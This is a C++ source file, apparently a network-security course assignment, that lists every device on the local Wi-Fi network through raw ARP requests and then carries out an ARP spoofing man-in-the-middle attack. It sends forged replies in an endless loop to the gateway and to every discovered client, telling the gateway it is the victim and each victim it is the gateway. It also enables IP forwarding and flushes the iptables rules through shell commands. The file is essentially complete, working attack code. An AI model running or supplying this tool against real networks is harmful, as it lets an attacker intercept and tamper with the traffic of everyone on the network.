#include <iostream>
#include <iomanip>
#include <map>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/ioctl.h>
#include <memory>
#include <array>
#include <linux/if_ether.h> // Include the header file that defines "ETH_P_ARP"
#include <net/if_arp.h>     // for ARPHRD_ETHER and ARPOP_REQUEST
#include <netinet/ether.h>
#include <linux/if_packet.h> // Include the header file that defines "struct sockaddr_ll"
#include <net/ethernet.h>
#include <thread>
#include <atomic>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>

using namespace std;

struct arp_header
{
    uint16_t htype;
    uint16_t ptype;
    uint8_t hlen;
    uint8_t plen;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
};
// struct arp_packet {
//     struct ethhdr eth;
//     struct arp_header arp;
// };
#define ETHER_HEADER_LEN sizeof(struct ether_header)
#define ETHER_ARP_LEN sizeof(struct ether_arp)
#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN
#define IP_ADDR_LEN 4
#define BROADCAST_ADDR                     \
    {                                      \
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff \
    }
string gateway_ip;
string source_ip;
string interface;
string source_mac;
int ifindex;

struct ether_arp *fill_arp_request_packet(const unsigned char *src_mac_addr, const char *src_ip, const char *dst_ip)
{
    struct ether_arp *arp_packet;
    struct in_addr src_in_addr, dst_in_addr;
    unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;
    // ip address translation
    inet_pton(AF_INET, src_ip, &src_in_addr);
    inet_pton(AF_INET, dst_ip, &dst_in_addr);

    // fill the arp packet
    arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
    arp_packet->arp_hrd = htons(ARPHRD_ETHER);
    arp_packet->arp_pro = htons(ETHERTYPE_IP);
    arp_packet->arp_hln = ETH_ALEN;
    arp_packet->arp_pln = IP_ADDR_LEN;
    arp_packet->arp_op = htons(ARPOP_REQUEST);
    memcpy(arp_packet->arp_sha, src_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_tha, dst_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_spa, &src_in_addr, IP_ADDR_LEN);
    memcpy(arp_packet->arp_tpa, &dst_in_addr, IP_ADDR_LEN);

    return arp_packet;
}

struct ether_arp *fill_arp_reply_packet(const char *src_ip,const unsigned char *src_mac_addr,  const char *dst_ip, const unsigned char *dst_mac_addr){
    struct ether_arp *arp_packet;
    struct in_addr src_in_addr, dst_in_addr;
    // ip address translation
    inet_pton(AF_INET, src_ip, &src_in_addr);
    inet_pton(AF_INET, dst_ip, &dst_in_addr);

    // fill the arp packet
    arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
    arp_packet->arp_hrd = htons(ARPHRD_ETHER);
    arp_packet->arp_pro = htons(ETHERTYPE_IP);
    arp_packet->arp_hln = ETH_ALEN;
    arp_packet->arp_pln = IP_ADDR_LEN;
    arp_packet->arp_op = htons(ARPOP_REPLY);
    memcpy(arp_packet->arp_sha, src_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_spa, &src_in_addr, IP_ADDR_LEN);
    memcpy(arp_packet->arp_tha, dst_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_tpa, &dst_in_addr, IP_ADDR_LEN);

    return arp_packet;
}



string exec(const char *cmd){
    array<char, 128> buffer;
    string result;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe)
    {
        throw runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
    {
        result += buffer.data();
    }
    return result;
}

map<string, string> devices;
atomic<bool> stop_receiving(false);
void receive_arp_reply(int sock_raw_fd)
{
    unsigned char buffer[ETHER_ARP_PACKET_LEN];
    ssize_t length;
    while (!stop_receiving)
    {
        length = recvfrom(sock_raw_fd, buffer, ETHER_ARP_PACKET_LEN, 0, NULL, NULL);
        if (length == -1)
        {
            cerr << "Error receiving packet." << endl;
        }
        else
        {
            // 解析 ARP 回覆
            struct ether_arp *arp_resp = (struct ether_arp *)(buffer + ETHER_HEADER_LEN);
            if (ntohs(arp_resp->arp_op) == ARPOP_REPLY)
            {
                // Extract sender IP address
                string sender_ip_str = inet_ntoa(*(struct in_addr *)arp_resp->arp_spa);

                // Extract sender MAC address
                char sender_mac_str[18];
                sprintf(sender_mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                        arp_resp->arp_sha[0], arp_resp->arp_sha[1], arp_resp->arp_sha[2],
                        arp_resp->arp_sha[3], arp_resp->arp_sha[4], arp_resp->arp_sha[5]);
                // add to devices
                devices[sender_ip_str] = sender_mac_str;
            }
        }
    }
}
void arp_request(const char *if_name, const char *base_ip)
{
    struct sockaddr_ll saddr_ll;
    struct ether_header *eth_header;
    struct ether_arp *arp_packet;
    struct ifreq ifr;
    char buf[ETHER_ARP_PACKET_LEN];
    unsigned char src_mac_addr[ETH_ALEN];
    unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;

    int sock_raw_fd, ret_len;

    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
    {
        cerr << "Error creating socket." << endl;
    }
    // cout << "Socket created: " << sock_raw_fd << endl;
    bzero(&saddr_ll, sizeof(struct sockaddr_ll));
    bzero(&ifr, sizeof(struct ifreq));
    memcpy(ifr.ifr_name, if_name, strlen(if_name));
    // cout << "Interface name: " << if_name << endl;
    // ifindex
    if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) < 0)
    {
        cerr << "Error getting index." << endl;
    }
    saddr_ll.sll_ifindex = ifr.ifr_ifindex;
    ifindex = ifr.ifr_ifindex;
    saddr_ll.sll_family = PF_PACKET;
    // cout << "Interface index: " << ifr.ifr_ifindex << endl;
    // local ip
    if (ioctl(sock_raw_fd, SIOCGIFADDR, &ifr) < 0)
        cerr << "Error getting src ip." << endl;
    char *src_ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
    // cout << "local IP: " << src_ip << endl;

    // local mac
    if (ioctl(sock_raw_fd, SIOCGIFHWADDR, &ifr) < 0)
    {
        cerr << "Error getting MAC address." << endl;
    }
    memcpy(src_mac_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    // store local MAC address
    char local_mac_str[18];
    sprintf(local_mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
            src_mac_addr[0], src_mac_addr[1], src_mac_addr[2],
            src_mac_addr[3], src_mac_addr[4], src_mac_addr[5]);
    source_mac = local_mac_str;
    // cout << "Local MAC: " << source_mac << endl;
    thread receive_thread(receive_arp_reply, sock_raw_fd);

    for (int i = 1; i < 255; i++)
    {
        string dst_ip = string(base_ip) + "." + to_string(i);
        // cout << "IP: " << dst_ip << endl;
        bzero(buf, ETHER_ARP_PACKET_LEN);
        // ethheader
        eth_header = (struct ether_header *)buf;
        memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);
        memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
        eth_header->ether_type = htons(ETHERTYPE_ARP);
        // arp packet
        arp_packet = fill_arp_request_packet(src_mac_addr, src_ip, dst_ip.c_str());
        memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);

        // sendto
        ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
        if (ret_len < 0)
        {
            cerr << "Error sending packet." << endl;
        }
    }

    stop_receiving = true;
    receive_thread.join();

    close(sock_raw_fd);
}

void list_devices()
{
    // get the interface name and gateway IP address
    gateway_ip = exec("ip route | grep default | awk '{print $3}'");
    gateway_ip.erase(gateway_ip.end() - 1);
    source_ip = exec("hostname -I");
    source_ip.erase(source_ip.end() - 1);
    interface = exec("ip route | grep default | awk '{print $5}'");
    interface.erase(interface.end() - 1);
    // cout << "Gateway IP: " << gateway_ip << endl;
    // cout << "Source IP: " << source_ip << endl;
    // cout << "Interface: " << interface << endl;
    cout << "Available devices:\n";
    cout << "---------------------------------\n";
    cout << "IP\t\tMAC\n";
    cout << "---------------------------------\n";
    string base_ip = gateway_ip.substr(0, gateway_ip.find_last_of("."));
    arp_request(interface.c_str(), base_ip.c_str());
    for (auto it = devices.begin(); it != devices.end(); ++it)
    {
        if (it->first == gateway_ip)
            continue;
        cout << it->first << "\t" << it->second << endl;
    }
}
void arp_reply(const char *if_name,const char *src_ip, const unsigned char *src_mac_addr, const char *dst_ip, const unsigned char *dst_mac_addr)
{
    struct sockaddr_ll saddr_ll;
    struct ether_header *eth_header;
    struct ether_arp *arp_packet;
    struct ifreq ifr;
    char buf[ETHER_ARP_PACKET_LEN];
    int sock_raw_fd, ret_len;

    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
    {
        cerr << "Error creating socket." << endl;
    }
    // cout << "Socket created: " << sock_raw_fd << endl;
    bzero(&saddr_ll, sizeof(struct sockaddr_ll));
    bzero(&ifr, sizeof(struct ifreq));
    memcpy(ifr.ifr_name, if_name, strlen(if_name));
    // cout << "Interface name: " << if_name << endl;
    // ifindex
    if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) < 0)
    {
        cerr << "Error getting index." << endl;
    }
    saddr_ll.sll_ifindex = ifr.ifr_ifindex;
    saddr_ll.sll_family = PF_PACKET;
    // cout << "Interface index: " << ifr.ifr_ifindex << endl;

    bzero(buf, ETHER_ARP_PACKET_LEN);
    // ethheader
    eth_header = (struct ether_header *)buf;
    memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);
    memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
    eth_header->ether_type = htons(ETHERTYPE_ARP);
    // arp packet
    arp_packet = fill_arp_reply_packet(src_ip, src_mac_addr, dst_ip, dst_mac_addr);
    memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);

    // sendto
    ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
    if (ret_len < 0)
    {
        cerr << "Error sending packet." << endl;
    }

    close(sock_raw_fd);
}

void keep_sending_arp_reply( unsigned char *source_mac_char, unsigned char *gateway_mac_char)
{
    while(true){
        // iterate all devices
        for(auto it = devices.begin(); it != devices.end(); ++it){
            // if the device is not the gateway and the source
            if(it->first != gateway_ip && it->first != source_ip){
                // change string of mac to unsigned char[6]
                unsigned char target_mac_char[6];
                sscanf(it->second.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                    &target_mac_char[0], &target_mac_char[1], &target_mac_char[2],
                    &target_mac_char[3], &target_mac_char[4], &target_mac_char[5]);
                
                // arpreply(interface, source_mac, source_ip, dst_ip, dst_mac)
                // send ARP reply to gateway // trick the gateway we are the victim
                arp_reply(interface.c_str(), it->first.c_str(), source_mac_char, gateway_ip.c_str(), gateway_mac_char);
                // send ARP reply to victim  // trick the victim we are the gateway
                arp_reply(interface.c_str(), gateway_ip.c_str(), source_mac_char, it->first.c_str(), target_mac_char);                
            }
        }
        this_thread::sleep_for(chrono::microseconds(500)); 
    }


}
void arp_spoofing()
{
    string gateway_mac = devices[gateway_ip];
    cout << "Gateway IP: " << gateway_ip << endl;
    cout << "Gateway MAC: " << gateway_mac << endl;
    cout << "Source IP: " << source_ip << endl;
    cout << "Source MAC: " << source_mac << endl;
    // change string of mac to unsigned char[6]
    unsigned char gateway_mac_char[6];
    sscanf(gateway_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &gateway_mac_char[0], &gateway_mac_char[1], &gateway_mac_char[2],
           &gateway_mac_char[3], &gateway_mac_char[4], &gateway_mac_char[5]);
    // change string of mac to unsigned char[6]
    unsigned char source_mac_char[6];
    sscanf(source_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &source_mac_char[0], &source_mac_char[1], &source_mac_char[2],
           &source_mac_char[3], &source_mac_char[4], &source_mac_char[5]);

    // thread to send ARP reply to gateway and victim
    thread arp_reply_thread(keep_sending_arp_reply, source_mac_char, gateway_mac_char);



    

    arp_reply_thread.join();
}

int main()
{
    system("sysctl -w net.ipv4.ip_forward=1 > /dev/null");
    system("iptables -F");
    system("iptables -F -t nat");
    // ...

    // task 1 : list all devices' IP/MAC addresses in the Wi-Fi network(except the attacker and gateway)
    list_devices();

    // task 2 : ARP spoofing for all other client devices in the Wi-Fi network
    /*
    Sending spoofed ARP packets to all neighbors (possible victims)
    to trick AP we are the victim and trick the victim we are AP
    */
    arp_spoofing();

    return 0;
}